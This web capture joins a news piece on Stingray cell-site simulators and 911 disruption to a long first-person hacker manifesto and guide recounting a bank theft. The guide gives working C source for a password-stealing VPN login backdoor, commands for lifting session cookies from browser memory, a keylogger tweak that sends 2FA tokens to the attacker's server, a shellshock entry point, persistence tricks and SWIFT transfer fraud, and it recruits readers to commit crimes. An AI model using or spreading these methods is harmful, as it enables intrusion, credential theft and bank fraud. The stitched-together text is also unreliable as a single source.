Ron Wyden Wants The DOJ To Provide Answers On Stingray Devices' Disruption =
Of Emergency Call Service
Legal Issues
from the gotta-risk-lives-to-save-lives-or-whatever dept
Tue, Aug 28th 2018 9:36am =E2=80=94 Tim Cushing
The FBI has admitted -- albeit not that publicly -- that Stingray devices d=
isrupt phone service. Spoofing a cell tower has negative effects on innocen=
t phone users as the device plays man-in-the-middle while trying to locate =
the targeted device. An unsealed document from a criminal prosecution and a=
ssertions made in warrant affidavits alleging "minimal" disruption are all =
we have to go on, at least in terms of official statements.
Supposedly, Stingrays are supposed to allow 911 service to continue uninter=
rupted. But it's hard to square that with the fact every phone in the devic=
e's range is forced to connect to the Stingray first before being allowed t=
o connect with a real cell tower. In some cases, the device might force eve=
ry phone in range to drop to a 2G connection. This may still allow 911 call=
s to take place, but almost any other form of communication will be impossi=
ble as long as the Stingray is in use.
Ron Wyden's staff technologist, Chris Soghoian (formerly of the ACLU), will=
 be fielding answers from the DOJ and FBI about 911 service disruptions, if=
 those answers ever arrive. Wyden's office has sent a letter [PDF] demandin=
g to know the extent of cell service disruption when Stingrays are deployed=
. And he'd also like to know if these agencies are being honest about the n=
egative side effects when agents seek warrants.
    1. The Communications Act of 1934 prohibits willful or malicious interf=
erence with licensed radio communications. How is a federal law enforcement=
 agency's use of a cell-site simulator not authorized by a court order cons=
istent with the prohibition on interference with radio communications in 47=
 U.S.C. 333?
    2. Is it the position of DOJ that a search warrant authorizing a federa=
l law enforcement agency to use a cell-site simulator overrides the statuto=
ry prohibition on interference in 47 U.S.C. 333? If yes, please explain Why=
    3. Does DOJ believe that it has an obligation under the duty of candor =
to notify federal courts considering an application for the use of a cell-s=
ite simulator that federal law prohibits interference with cellular communi=
cations? If not, please explain why.
    4. Is it the position of DOJ that it is lawful, with or without a court=
 order, for a federal law enforcement agency to interfere with licensed rad=
io communications such that it disrupts a surveillance target's emergency c=
ellular communications with 9-1-1? If yes, please explain why.
We'll see if Wyden gets his answers. The DOJ still has yet to answer simila=
r questions Wyden asked last year, and there's little reason to believe its=
 response time to questions it doesn't want to answer has improved since 20=
There is evidence cell site simulators do interfere with 911 service, even =
if the US government has yet to admit it. A document obtained by the ACLU f=
rom the Royal Canadian Mounted Police clearly states cell site simulators h=
ave negative effects on emergency calls.
    The MDI [Mobile Device Identifier] will shut itself off if a mobile wit=
hin its range dials 911. However, recent testing at HQ revealed that more t=
han 50% of the GSM mobile telephones tested had not automatically completed=
 their 911 calls after the MDI had shut itself off.
This memo says the RCMP should inform judges of this possible side effect w=
hen seeking warrants and use a 3-minutes-on, 2-minutes-off cycle to minimiz=
e cell service disruption and overcollection of cell data from non-targets.=
 If the DOJ has directed the FBI to engage in practices like these, it has =
yet to make that information public. From what little has been gleaned from=
 public statements and begrudging answers to legislators and Congressional =
committees, the FBI's use of Stingrays appears to only be constrained by a =
warrant requirement that is merely the DOJ's internal policy, rather than c=
odified by law.

I am a wild child
Innocent, free, wild
I am all ages
My grandparents live on in me
I am a brother of the clouds
And I only know how to share
I know that everything belongs to everyone,
That everything is alive in me
My heart is a star
I am a son of the earth
Traveling aboard my spirit
I walk to eternity
These are my simple words that seek to touch the hearts of people who are s=
imple and humble, but also dignified and rebellious.  These are my simple w=
ords to tell about my hacks, and to invite other people to hack with cheerf=
ul rebellion.
I hacked a bank. I did it to give an injection of liquidity, but this time =
from below and to the simple and humble people who resist and rebel against=
 injustices throughout the world. In other words: I robbed a bank and gave =
away the money.  But it wasn't me alone who did it. The free software movem=
ent, the offensive powershell community, the metasploit project and the hac=
ker community in general are what made this hack possible. The exploit.in c=
ommunity made it possible to convert intrusion into a bank's computers into=
 cash and bitcoin. The Tor, Qubes and Whonix projects, together with the cr=
yptographers and activists who defend privacy and anonymity, are my nahuale=
s, that is, my protectors [1]. They accompany me every night and make it po=
ssible for me to remain free.
I did nothing complicated. I only saw the injustice in this world, felt lov=
e for all beings, and expressed that love in the best way I could, through =
the tools I know how to use. Hate does not move me to banks, or to the rich=
, but a love for life, and the desire for a world where everyone can realiz=
e their potential and live a full life. I would like to explain a little ho=
w I see the world, so that you can get an idea of how I came to feel and ac=
t like this. And I also hope that this guide is a recipe that you can follo=
w, combining the same ingredients to bake the same cake. Who knows, out the=
re these powerful tools could end up also serving you to express the love y=
ou feel.
We are all innocent, free, wild wild children
We are all brothers of the trees children of the earth
We just have to put in our hearts a burning star
(song by Alberto Kuselman and Chamal=C3=BA)
The police will invest a chingo of resources to investigate me. They think =
the system works, or at least it will work once they catch all the =
=E2=80=9Cbad boys=E2=80=9D. I am nothing more than the product of a system =
that does not work. As long as there is injustice, exploitation, alienation=
, violence and ecological destruction, many more will come like me: an endl=
ess series of people who will reject as illegitimate the bad system respons=
ible for this suffering. That badly done system is not going to get fixed b=
y arresting me. I am only one of the millions of seeds that Tupac planted 2=
38 years ago in La Paz [2], and I hope that my actions and writings water t=
he seed of rebellion in their hearts.
[1]  [2]  It was before he was killed by the Spaniards, just a day like yesterda=
y, that he said that "they will only kill me, but tomorrow I will return an=
d be millions."

To make us listen, hackers sometimes have to cover their faces, because we =
are not interested you in seeing our face but instead in understanding our =
word.  The mask can be from Guy Fawkes, Salvador Dal=C3=AD, from Fsociety, =
or in some cases the puppet of a crested toad. By affinity, this time I wen=
t to dig up a dead man to lend me his balaclava. I think then that I should=
 clarify that Sup Marcos is innocent of all that is told here because, besi=
des being dead, I did not consult him. I hope that his ghost, if he finds o=
ut from a Chiapaneca hammock, knows how to find the goodness to, as they sa=
y there, "dismiss this deep fake" with the same gesture with which an unwel=
come insect moves away - which could well be a beetle.
Even so with the balaclava and the name change, many of those who support m=
y actions may pay too much attention to my person. With their own autonomy =
shattered for a lifetime of domination, they will be looking for a leader t=
o follow, or a hero who saves them. But behind the balaclava, I'm just a gi=
rl. We are all wild children. We just have to place a star in the beds in o=
ur hearts.
[1 - Why expropriate]
Capitalism is a system in which a minority has come to appropriate a vast m=
ajority of the world's resources through war, theft and exploitation.  By s=
natching the commons [1], they forced those below to be under the control o=
f that minority that owns everything.  It is a system fundamentally incompa=
tible with freedom, equality, democracy and the Suma Qama=C3=B1a (Good Livi=
ng). It may sound ridiculous to those of us who have grown up in a propagan=
da machine that taught us that capitalism is freedom, but in truth what I a=
m saying is not a new or controversial idea [2]. The founders of the United=
 States of America knew they had to choose between creating a capitalist so=
ciety, or a free and democratic society.  Madison recognized that "the man =
who possesses wealth, the one who lies on his couch or rolls in his carriag=
e, cannot judge the wishes or feelings of the day laborer."  But to protect=
 against the "spirit of equalization" of landless day laborers, it seemed t=
o him that only landowners should vote, and that the government had to serv=
e to "protect the opulent minority against the great majority."  John Jay w=
as more to the point and said: "Those who own the country should rule it."

Evgeny, the great ignored elephant, doesn't understand why everyone pretend=
s not to see him on the panels on climate change, so here I give him a chan=
ce to say his lines.
In the same way that bell hooks [3] argues that the rejection of the patria=
rchal culture of domination is an act in defense of the male's own interest=
 (since it emotionally mutilates them and prevents them from feeling full l=
ove and connection), I think that the culture of domination of capitalism h=
as a similar effect on the rich, and that they could have fuller and more s=
atisfying lives if they rejected the class system from which they believe t=
hey benefit.  For many, class privilege amounts to a childhood of emotional=
 neglect, followed by a life of superficial social interactions and meaning=
less work. In the end they may know that they can only genuinely connect wi=
th people when they work with them as their peers, and not when they put th=
em at their service. They may know that sharing their material wealth is th=
e best they can do with it. You may also know that the significant experien=
ces, connections and relationships that count are not those that come from =
business interactions, but precisely to reject the logic of the market and =
give without expecting anything in return. They may know that all they need=
 to escape from their prison and really live is to get carried away, give u=
p control, and take a leap of faith. But most lack courage.
Then it would be naive of us to direct our efforts to try to produce some k=
ind of spiritual awakening in the rich [4].  As Astata Shakur says: "No one=
 in the world, no one in history, has ever achieved his freedom by appealin=
g to the moral sense of his oppressors". In fact, when the rich divide thei=
r money, they almost always do it in a way that reinforces the system that =
allowed them to amass their enormous and illegitimate wealth [5]. And chang=
e is unlikely to come through a political process; As Lucy Parsons says: "L=
et us never be fooled that the rich will let us vote to take away their wea=
lth." Colin Jenkins justifies the expropriation with these words [6]:
Make no mistake, expropriation is not theft. It is not the confiscation of =
money earned "with the sweat of the forehead". It is not theft of private p=
roperty. It is, rather, the recovery of enormous amounts of land and wealth=
 that have been forged with stolen natural resources, human slavery, forced=
 labor force and amassed in hundreds of years by a small minority. This wea=
lth ... is illegitimate, both for moral purposes and for the exploitation m=
echanisms that have been used to create it.
For Colin, the first step is that =E2=80=9Cwe have to free ourselves from o=
ur mental ties (believing that wealth and private property have been earned=
 by those who monopolize them; and that, therefore, they should be somethin=
g to respect, revere, and even  something to pursue), open our minds, study=
 and learn from history, and recognize this illegitimacy together=E2=80=
=9D. Here are some books that have helped me with this: [7] [8] [9] [10] [1=
 According to Barack Obama, economic inequality is "the challenge that defi=
nes our time."  Computer hacking is a powerful tool to combat economic ineq=
uality.  The former director of the NSA, Keith Alexander, agrees and says t=
hat hacking is responsible for "the greatest transfer of wealth in history.=

 [2 - Introduction]
This guide explains how I hacked the Cayman Bank and Trust Company (Isle of=
 Man).  Why am I publishing this, almost four years later?
 1) To show what is possible
Hackers working for social change have limited themselves to developing sec=
urity and privacy tools, DDoS, performing vandalism and leaks. Wherever you=
 go, there are radical projects for a social change in a complete state of =
precariousness, and there would be much that they could do with some exprop=
riated money. At least for the working class, bank robbery is something soc=
ially accepted, and those who do are seen as heroes of the people. In the d=
igital age, robbing a bank is a non-violent, less risky act, and the reward=
 is greater than ever. So why are only black hat hackers doing it for their=
 personal benefit, and never hacktivists to finance radical projects? Maybe=
 they don't think they are capable of doing it. The big bank hacks are on t=
he news every so often, such as the hacking of the Bank of Bangladesh [1], =
which was attributed to North Korea, or the hacking of banks attributed to =
the Carbanak group [2], which they describe as a very large and well organi=
zed group of Russian hackers, with different members who would be specializ=
ed in different tasks. But, it is not that complicated.
It is because of our collective belief that the financial system is unquest=
ionable that we exercise control over ourselves, and maintain the class sys=
tem without those above having to do anything [3]. Being able to see how vu=
lnerable and fragile the financial system really is helps us break that col=
lective hallucination. That is why banks have a strong incentive not to rep=
ort hacks, and to exaggerate how sophisticated the attackers are. None of t=
he financial hacks I made, or those I've known, have ever been reported. Th=
is is going to be the first, and not because the bank wanted to, but becaus=
e I decided to publish it.
As you are about to learn in this home guide, hacking a bank and transferri=
ng money through the SWIFT network does not require the support of any gove=
rnment or a large and specialized group.  It is something totally possible =
being a mere amateur hacker, with only public tools and basic knowledge of =
how to write a script.
[1] [2] [3]  2) Help withdraw cash
Many of those who read this already have, or with a little study will be ab=
le to acquire, the skills needed to carry out a hack like this.  However, m=
any will find that they lack the necessary criminal connections to get the =
handles in condition. In my case, this was the first bank that hacked, and =
at that time I only had a few and mediocre accounts ready to withdraw the c=
ash (known as bank drops), so it was only a few hundred thousand that I cou=
ld withdraw at total, when it is normal to get millions. Now, on the other =
hand, I do have the knowledge and connections to get cash more seriously, s=
o if you are hacking a bank but need help to convert that into real money, =
and you want to use that money to finance radical social projects, you can =
contact me.
 3) Collaborate
It is possible to hack banks as an amateur who works alone, but the net is =
that, in general, it is not as easy as I paint it here.  I was lucky with t=
his bank for several reasons:
1. It was a small bank, so it took me much less time to understand how ever=
ything worked.
2. They had no procedure to check the sent swift messages.  Many banks have=
 one, and you need to write code to hide your transfers from their monitori=
ng system.
3. They only used password authentication to access the application with wh=
ich they connected to the SWIFT network. Most banks now use RSA SecurID, or=
 some form of 2FA.  You can skip this by typing code to get an alert when y=
our token enters, so you can use it before it expires. It's simpler than it=
 seems: I used Get-Keystrokes [1], modifying it so that instead of storing =
the pressed keys, a GET request is made to my server every time it is detec=
ted that they have entered a username. This request adds the username to th=
e url and, as they type the token, several GETs are made with the token dig=
its concatenated to the url. On my side I leave this running in the meantim=
  ssh me 'tail -f /var/log/apache2/access_log'
 while read i; do echo $i; aplay alarma.wav &> /dev/null; done
 If it is a web application, you can skip the 2FA by stealing the cookie af=
ter they have authenticated. I am not an APT with a team of coders who can =
make me customized tools. I am a simple person who subsists on what the ter=
minal gives [2], so what I use is:
procdump64 /accepteula -r -ma PID_of_browser
 strings64 /accepteula * .dmp |  findstr PHPSESSID 2> nul
 or going through findstr rather than strings, which makes it much faster:
findstr PHPSESSID * .dmp> tmp
     strings64 /accepteula tmp |  findstr PHPSESSID 2> nul
Another way to skip it is to access your session with a hidden VNC (hvnc) a=
fter they have authenticated, or with a little creativity you could also fo=
cus on another part of their process instead of sending SWIFT messages dire=
I think that if I collaborated with other experienced bank hackers we could=
 hack hundreds of banks like Carnabak, instead of doing one from time to ti=
me on my own.  So if you have experience with similar hacks and want to col=
laborate, contact me.  You will find my email and my PGP key at the end of =
the previous guide [3].

 [3 - Be careful out there]
It is important to take some simple precautions.  I will refer to this same=
 section of my last guide [1], since it seems to work just fine [2]. All I =
have to add is that, in Trump's words, "Unless you catch hackers in the act=
, it is difficult to determine who was doing the hacking," so the police ar=
e getting more and more creative [3][4] in their attempts to grab criminals=
 in the act (when their encrypted hard drives are unlocked). So it would be=
 nice if for example you carry a certain bluetooth device and configure you=
r computer to turn off when it moves beyond a certain range, or when an acc=
elerometer detects movement, or something like that.
It may be that writing long articles detailing your actions and your ideolo=
gy is not the safest thing in the world (oops!), but at times I feel I have=
 to.
 If I didn't believe in who listens to me
 If I didn't believe in what hurts
 If I didn't believe in what's left
 If I didn't believe in what I fought
 What a thing ...
 What was the club without a quarry?
[1] [2] [3] [4]  Many blame queer people for the decline of this society;
 we are proud of it
 Some believe we want to reduce to ashes
 this civilization and its moral fabric;
 They couldn't be more right
 They often describe us as depraved, decadent and revolting
 But alas! They haven't seen anything yet
 [4 - Get access]
In another place [1] I talked about the main ways to get initial access to =
a company's network during a targeted attack. However, this was not a targe=
ted attack. I did not set out to hack a specific bank, what I wanted was to=
 hack any bank, which ends up being a much simpler task.  This type of nons=
pecific approach was popularized by Lulzsec and Anonymous [2]. As part of t=
he earlier essay, I prepared an exploit and post-exploitation tools for a p=
opular VPN device. Then I started scanning the entire internet with zmap an=
d zgrab to identify other vulnerable devices [3]. I had the scanner save th=
e vulnerable IPs, along with the common and alt names of the device's SSL c=
ertificate, the device's Windows domain names, and the reverse DNS lookup o=
f the IP. I grepped the results for the word "bank", and there were plenty =
to choose from, but the truth is that I was attracted to the word "Cayman",=
 and that's how I came to choose this one.
[1] [2] [3]  [4.1 - The Exploit]
When I published my latest DIY guide [1] I did not reveal the details of th=
e sonicwall exploit that I had used to hack Hacking Team, as it was very us=
eful for other hacks (such as this one) and I still had not finished having=
 fun with it. Determined then to hack Hacking Team, I spent weeks reverse e=
ngineering their sonicwall ssl-vpn model, and even managed to find several =
memory corruption vulnerabilities that were more or less difficult to explo=
it, before I realized that the device was easily exploitable with shellshoc=
k [2].  When shellshock came out, many sonicwall devices were vulnerable, w=
ith only a request to cgi-bin/welcome and a payload in the user-agent. Dell=
 released a security update and an advisory for these versions. The version=
 used by Hacking Team and this bank had the vulnerable bash version, but th=
e cgi requests did not trigger the shellshock- except for the requests to a=
 shell script, and there was one accessible: cgi-bin/jarrewrite.sh. This se=
ems to have escaped Dell's notice, since they never released a security upd=
ate or an advisory for that version of the sonicwall. And, kindly, Dell had=
 setuid=E2=80=99d root on dos2unix, leaving the device easy to root.
In my last guide many read that I spent weeks researching a device until I =
found an exploit, and assumed that it meant that I was some kind of elite h=
acker. The reality, that is, the fact that it took me two weeks to realize =
that it was trivially exploitable with shellshock, is perhaps less flatteri=
ng to me, but I think it is also more inspiring. Shows that you can really =
do this for yourself. You don't need to be a genius, I certainly am not.  A=
ctually my work against Hacking Team started a year earlier. When I discove=
red Hacking Team and the Gamma Group in the CitizenLab investigations [3][4=
], I decided to explore a bit and see if I could find anything. I didn't ge=
t anywhere with Hacking Team, but I was lucky with Gamma Group, and I was a=
ble to hack their customer support portal with basic sql injection and file=
 upload vulnerabilities [5][6]. However, although the customer support serv=
er gave me a pivot towards the internal network of Gamma Group, I was unabl=
e to penetrate further into the company. From this experience with the Gamm=
a Group and other hacks, I realized that I was really limited by my lack of=
 knowledge about privilege escalation and lateral movement in windows domai=
ns, active directory and windows in general.  So I studied and practiced (s=
ee section 11), until I felt I was ready to pay a visit to Hacking Team alm=
ost a year later. The practice paid off, and this time I was able to make a=
 complete commitment from the company [7]. Before I realized that I could e=
nter with shellshock, I was willing to spend happy whole months of life stu=
dying exploit development and writing a reliable exploit for one of the mem=
ory corruption vulnerabilities I had encountered. I just knew that Hacking =
Team needed to be exposed, and that it would take me as much time as necess=
ary and learn what I had to learn to get it. To perform these hacks you don=
't need to be bright. You don't even need great technical knowledge. You ju=
st need dedication, and believe in yourself.
[1] [2] [3] [4] [5] [6] [7]  [4.2 - The Backdoor]
Part of the backdoor I prepared for Hacking Team (see the first footnote in=
 section 6) was a simple wrapper on the login page to capture passwords:
     int main()
        char buf[2048];
        int nread, pfile;
        /* pull the log if we send a special cookie */
        char *cookies =3D getenv("HTTP_COOKIE");
        if (cookies && strstr(cookies, "our private password")) {
                write(1, "Content-type: text/plain\n\n", 26);
                pfile =3D open("/tmp/.pfile", O_RDONLY);
                while ((nread =3D read(pfile, buf, sizeof(buf))) > 0)
                        write(1, buf, nread);
                exit(0);
        }
        /* the parent stores the POST data and sends it to the child, which=
 is the actual login program */
        int fd[2];
        pipe(fd);
        pfile =3D open("/tmp/.pfile", O_APPEND | O_CREAT | O_WRONLY, 0600);
        if (fork()) {
                close(fd[0]);
                while ((nread =3D read(0, buf, sizeof(buf))) > 0) {
                        write(fd[1], buf, nread);
                        write(pfile, buf, nread);
                }
                write(pfile, "\n", 1);
                close(fd[1]);
                close(pfile);
                wait(NULL);
        } else {
                close(fd[1]);
                dup2(fd[0],0);
                close(fd[0]);
                execl("/usr/src/EasyAccess/www/cgi-bin/.userLogin",
                      "userLogin", NULL);
        }
In the case of Hacking Team, they were logging on to the VPN with single-us=
e passwords, so the VPN gave me access only to the network, and from there =
it took an extra effort to get domain admins on their network. In the other=
 guide I wrote about side passes and privilege escalation in windows domain=
s [1]. In this case, on the other hand, it was the same Windows domain pass=
words that were used to authenticate against the VPN, so I could get a good=
 user password, including that of the domain admin. Now I had full access t=
o his network, but usually this is the easy part. The most complicated part=
 is to understand how they operate and how to get what you want out of thei=
r network.
[1] [4.3 - Fun facts]
Following the investigation they did about the hacking, I found it interest=
ing to see that, by the same time I did it, the bank could have been compro=
mised by someone else through a targeted phishing email [1].  As the old sa=
ying goes, "give a man an exploit and he will have access for a day, teach =
phishing and he will have access all his life" [2]. The fact that someone e=
lse, by chance and at the same time as me, put this small bank in the spotl=
ight (they registered a domain similar to the real domain of the bank to be=
 able to phish from there) suggests that bank hacks occur with  much more f=
requently than is known.
A fun suggestion for you to follow the investigations of your hacks is to h=
ave a backup access, one that you won't touch unless you lose normal access=
. I have a simple script that expects commands once a day, or less, just to=
 maintain long-term access in case they block my regular access. Then I had=
 a powershell empire [3] calling home more frequently to a different IP, an=
d I used empire to launch meterpreter [4] against a third IP, where I did m=
ost of my work. When PWC started investigating the hacking, they found my u=
se of empire and meterpreter and cleaned those computers and blocked those =
IPs, but they didn't detect my backup access. PWC had placed network monito=
ring devices, in order to analyze the traffic and see if there were still i=
nfected computers, so I didn't want to connect much to their network. I onl=
y launched mimikatz once to get the new passwords, and from there I could c=
ontinue my research by reading their emails in the outlook web access.

[2] [3] [4]  [5 - Understand Banking Operations]
To understand how the bank operated, and how I could get money, I followed =
the techniques that I summarized in [1], in section =E2=80=9C13.3 - Interna=
l Recognition=E2=80=9D. I downloaded a list of all file names, grepped for =
words like "SWIFT" and "transfer", and downloaded and read all files with i=
nteresting names. I also looked for emails from employees, but by far the m=
ost useful technique was to use keyloggers and screenshots to see how bank =
employees worked. I didn't know it at the time, but for this, Windows has a=
 very good monitoring tool [2].  As described in technique no. 5 of section=
 13.3 in [1], I made a capture of the keys pressed throughout the domain (i=
ncluding window titles), I did a grep in search of SWIFT, and found some em=
ployees opening =E2=80=98SWIFT Access Service Bureau - Logon=E2=80=99. For =
those employees, I ran meterpreter as in [3], and used the post/windows/gat=
her/screen_spy module to take screenshots every 5 seconds, to see how they =
worked. They were using a remote citrix app from the bottomline company [4]=
 to access the SWIFT network, where each payment message SWIFT MT103 had to=
 go through three employees: one to "create" the message, one to "verify" i=
t,  and another to "authorize it." Since I already had all their credential=
s thanks to the keylogger, I could easily perform all three steps myself.  =
And from what I knew after seeing them work, they didn't review the SWIFT m=
essages sent, so I should have enough time to get the money from my bank dr=
ops before the bank realized and tried to reverse the transfers.

[6 - Send the money]
I had no idea what I was doing, so I was discovering it along the way. Some=
how, the first transfers I sent went well. The next day, I screwed up by se=
nding a transfer to Mexico that ended my fun. This bank sent its internatio=
nal transfers through its correspondent account in Natwest. I had seen that=
 the correspondent account for transfers in pounds sterling (GBP) appeared =
as NWBKGB2LGPL, while for the others it was NWBKGB2LXXX. The Mexican transf=
er was in GBP, so I assumed that I had to put NWBKGB2LGPL as a corresponden=
t. If I had prepared it better I would have known that the GPL instead of X=
XX indicated that the payment would be sent through the UK Fast Payment Ser=
vice, rather than as an international transfer, which obviously will not wo=
rk when you are trying of sending money to Mexico. So the bank got an error=
 message. On the same day I also tried to send a payment of =C2=A3200k to t=
he UK using NWBKGB2LGPL, which was not made because 200k exceeded the shipp=
ing limit by fast payments, and would have had to use NWBKGB2LXXX instead. =
They also received an error message for this. They read the messages, inves=
tigated it, and found the rest of my transfers.
[7 - The loot]
From what I write, you can get a complete idea of what my ideals are and to=
 what things I give my support. But I would not like to see anyone in legal=
 trouble for receiving expropriated funds, so not another word of where the=
 money went. I know that journalists are probably going to want to put some=
 number on how many dollars were distributed in this hack and similar ones,=
 but I prefer not to encourage our perverse habit of measuring the actions =
just by their economic value. Any action is admirable if it comes from love=
 and not from the ego. Unfortunately those above, the rich and powerful, pu=
blic figures, businessmen, people in "important" positions, those that our =
society most respects and values, those have been placed where they are bas=
ed on acting more since the ego than from love. It is in the simple, humble=
 and "invisible" people that we should look at and whom we should admire.
[8 - Cryptocurrencies]
Redistributing expropriated money to Chilean projects seeking positive soci=
al change would be easier and safer if those projects accepted anonymous do=
nations via cryptocurrencies such as monero, zcash, or at least bitcoin. It=
 is understood that many of these projects have an aversion to cryptocurren=
cies, as they resemble some strange hypercapitalist dystopia rather than th=
e social economy we dream of. I share their skepticism, but I think they ar=
e useful to allow donations and anonymous transactions, by limiting governm=
ent surveillance and control. Same as cash, whose use many countries are tr=
ying to limit for the same reason.
[9 - Powershell]
In this operation, as in [1], I used a lot of powershell. Then, powershell =
was super cool, you could do almost anything you wanted, without antivirus =
detection and with very little forensic footprint. It happens that with the=
 introduction of AMSI [2], offensive powershell is retiring. Today offensiv=
e C# is what is on the rise, with tools like [3][4][5][6]. AMSI is going to=
 get to .NET for 4.8, so the tools in C# probably still have a couple of ye=
ars left before they get dated. And then we will use C or C++ again, or may=
be Delphi will become fashionable again. The specific tools and techniques =
change every few years, but basically it is not so much what changes, today=
 hacking is essentially the same thing it was in the 90s. In fact, all the =
powershell scripts used in this guide and in the previous one are still per=
fectly usable today, after a little obfuscation of your own.

Privacy for the weak, transparency for the powerful.
Offshore banking provides executives, politicians and millionaires with pri=
vacy from of their own government. Exposing them may sound hypocritical on =
my part, since I am generally in favor of privacy and against government ov=
ersight. But the law was already written by and for the rich: it protects i=
ts system of exploitation, with some limits (such as taxes) so that society=
 can function and the system does not collapse under the weight of its own =
greed. So no, privacy is not the same for the powerful, when it allows them=
 to evade the limits of a system designed to give them privileges; and priv=
acy for the weak, whom it protects from a system designed to exploit them.
Even journalists with the best intentions find it impossible to study such =
a huge amount of material and know what will be relevant for people in diff=
erent parts of the world. When I leaked the Hacking Team files, I gave The =
Intercept a copy of the emails one month in advance. They found a couple of=
 the 0days that Hacking Team was using, previously reported them to MS and =
Adobe and published a few stories once the leak was made public. There is n=
o point of comparison with the enormous amount of articles and research tha=
t came after the complete leak to the public. Seeing it this way, and also =
considering the (not) editorialized publication [1] of the Panama papers, I=
 think that a public and complete leak of this material is the right choice=
[1] Psychologists found that those who are lower in the hierarchies tend to und=
erstand and empathize with those at the top, but vice versa is less common.=
 This explains why, in this sexist world, many men joke about their inabili=
ty to understand women, as if it were an irresolvable mystery. Explains why=
 the rich, if they stop to think about those who live in poverty, give advi=
ce and "solutions" so alien to reality that we want to laugh. Explain why w=
e revere executives as brave who take risks. What do they risk, beyond thei=
r privilege? If all their ventures fail, they will have to live and work li=
ke the rest of us. It also explains why there will be many who accuse me of=
 being irresponsible and dangerous by leaking this without redaction. They =
feel the "danger" around an offshore bank and its customers much more inten=
sely than they feel the misery of those dispossessed by this unfair and une=
qual system. And this leak of their finances, is it a danger to them, or pe=
rhaps only to their position at the top of a hierarchy that should not even=
 exist?
Translation: =E2=80=9CThey vilify us, these infamous people; When the only =

[11 - Learn to hack]
You don't start hacking well. You start hacking shit, thinking it's good, a=
nd then gradually you get better. That is why I always say that one of the =
most valuable virtues is persistence.
- Octavia Butler's advice for the APT candidate
The best way to learn to hack is by hacking. Put together a laboratory with=
 virtual machines and start testing things, taking a break to investigate a=
nything you don't understand. At the very least you will want a windows ser=
ver as a domain controller, another normal Windows vm attached to the domai=
n, and a development machine with visual studio to compile and modify tools=
. Try to make an office document with macros that launch meterpreter or ano=
ther RAT, and try meterpreter, mimikatz, bloodhound, kerberoasting, smb rel=
aying, psexec and other lateral movement techniques[1]; as well as the othe=
r scripts, tools and techniques mentioned in this guide and in the previous=
 one[2]. At first you can disable windows defender, but then try it all by =
having it activated [3][4] (but deactivating the automatic sending of sampl=
es). Once you're comfortable with all that, you'll be ready to hack 99% of =
companies. There are a couple of things that at some point will be very use=
ful in your learning, such as getting comfortable with bash and cmd.exe, a =
basic domain of powershell, python and javascript, having knowledge of kerb=
eros [5][6] and active directory [7][8][9][10], and fluent English. A good =
introductory book is The Hacker Playbook.
I also want to write a little about things to not focus on if you don't wan=
t to entertain the idea of you hacking things just because someone has told=
 you that you are not a =E2=80=9Creal=E2=80=9D hacker if you don't know ass=
embly. Obviously, learn whatever interests you, but I write these lines thi=
nking about those things that you can focus on in order to get practical re=
sults if you're looking to hack companies to filter and expropriate. A basi=
c knowledge of web application security [11] is useful, but specializing mo=
re in web security is not really the best use of your time, unless you want=
 to make a career in pentesting or chasing bug rewards. CTFs, and most of t=
he resources you'll find when looking for information about hacking, genera=
lly focus on skills such as web security, reverse engineering, exploit deve=
lopment, etc. These things make sense by understanding them as a way to pre=
pare people for careers in the industry, but not for our goals. Intelligenc=
e agencies can afford to have a team dedicated to the most advanced techniq=
ues in fuzzing, a team working on exploit development with a guy investigat=
ing exclusively the new techniques of heap manipulation, etc. We don't have=
 the time or the resources for that. The two most important skills for prac=
tical hacking are phishing [12] and social engineering to get initial acces=
s, and then being able to climb and move through the Windows domains.

[13 - Heal]
The hacker world has a high incidence of depression, suicides and certain b=
attles with mental health. I don't think it's because of hacking, but becau=
se of the kind of environment that hackers mostly come from. Like many hack=
ers, I grew up with little human contact: I was a girl raised by the intern=
et. I have my struggles with depression and emotional numbness. Willie Sutt=
on is frequently quoted as saying that he robbed banks because "that's wher=
e the money is," but the quote is incorrect. What he really said was:
Why did I rob banks? Because I enjoyed it. I loved to do it. I was more ali=
ve when I was inside a bank, in full robbery, than at any other time in my =
life. I enjoyed it so much that one or two weeks later I was already lookin=
g for the next opportunity. But for me money was a minutiae, nothing more.
Hacking has made me feel alive. It started as a way to self-medicate depres=
sion. Later I realized that, in reality, I could do something positive. I d=
on't regret the way I grew up at all, it brought several beautiful experien=
ces to my life. But I knew I couldn't continue living that way. So I began =
to spend more time away from my computer, with other people, learning to op=
en myself to the world, to feel my emotions, to connect with others, to acc=
ept risks and be vulnerable. Things much harder than hacking, but at the me=
re hour the reward is more worth it. It is still an effort, but even if it =
is slow and wobbly, I feel that I am on my way.
Hacking, done with conscience, can also be what heals us. According to Maya=
n wisdom, we have a gift granted by nature, which we must understand to put=
 it at the service of the community. In [1], it is explained:
When a person does not accept his job or mission he begins to suffer from s=
eemingly incurable diseases; although he does not die in a short time, but =
only suffers, in order to wake up or become aware. That is why it is essent=
ial that a person who has acquired the knowledge and does his work in the c=
ommunities must pay his Toj and maintain constant communication with the Cr=
eator and his ruw=C3=A4ch q=E2=80=99ij, since he constantly needs their str=
ength and energy. Otherwise, the diseases that caused him to react or take =
the job could cause damage again.
If you feel that hacking is feeding your isolation, depression, or other co=
nditions, breathe. Give yourself some time to meet and become aware. You de=
serve to live happily, with health and fullness.

[14 - The Bug Hacktivist Program]
It seems to me that hacking to get and leak documents of public interest is=
 one of the best ways in which hackers can use their skills for the benefit=
 of society. Unfortunately for us hackers, as in almost every category, the=
 perverse incentives of our economic system do not coincide with what benef=
its society. So this program is my attempt to make it possible for good hac=
kers to earn a living in an honest way by revealing material of public inte=
rest, instead of having to go selling their work to the cybersecurity, cybe=
rcrime or business industries. Cyberwar Some examples of companies whose le=
aks I would love to pay for are:
- the mining, logging and livestock companies that plunder our beautiful La=
tin America (and kill land and territory defenders trying to stop them)
- companies involved in attacks on Rojava such as Baykar Makina or Havelsan
- surveillance companies such as the NSO group
- war criminals and birds of prey such as Blackwater and Halliburton
- private penitentiary companies such as GeoGroup and CoreCivic / CCA, and =
corporate lobbyists such as ALEC
Pay attention when choosing where to investigate. For example, it is well k=
nown that oil companies are evil: they get rich at the cost of destroying t=
he planet (and back in the 80s the companies themselves already knew about =
the consequences of their activity [1]). But if you hack them directly, you=
 will have to dive into an incredible amount of boring information about yo=
ur daily operations. Very likely it will be much easier for you to find som=
ething interesting if instead you focus on your lobbyists [2]. Another way =
to select viable goals is to read stories of investigative journalists (suc=
h as [3]), which are interesting but lack solid evidence. And that is exact=
ly what your hacks can find.
I will pay up to 100 thousand USD for each filtration of this type, accordi=
ng to the public interest and impact of the material, and the labor require=
